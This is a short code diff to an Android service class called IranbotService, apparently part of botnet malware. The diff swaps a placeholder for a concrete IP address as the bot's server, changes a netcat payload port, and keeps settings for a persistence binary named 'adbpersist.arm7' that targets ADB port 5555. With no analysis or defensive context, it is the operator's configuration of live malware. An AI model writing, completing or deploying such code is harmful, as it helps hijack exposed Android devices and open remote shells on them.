@@ -1,4 +1,4 @@
-package com.iranbot.loadd;
+package com.meow.laod;
 
 import android.app.AlarmManager;
 import android.app.Notification;
@@ -18,9 +18,9 @@ import java.nio.*;
 
 public class IranbotService extends Service {
 
-    private static final String DOMAIN = "YOUR_IP_HERE";
+    private static final String DOMAIN = "91.208.162.36";
     private static final int PORT = 80;
-    private static final int NC_PAYLOAD_PORT = 4444;
+    private static final int NC_PAYLOAD_PORT = 4441;
     private static final String BINARY_NAME = "adbpersist.arm7"; //BIN NAME YOU SET, DEFAULT IS ADBPERSIST.ARM7
     private static final int TARGET_PORT = 5555;
     private static final int SLEEP_INTERVAL = 50000;
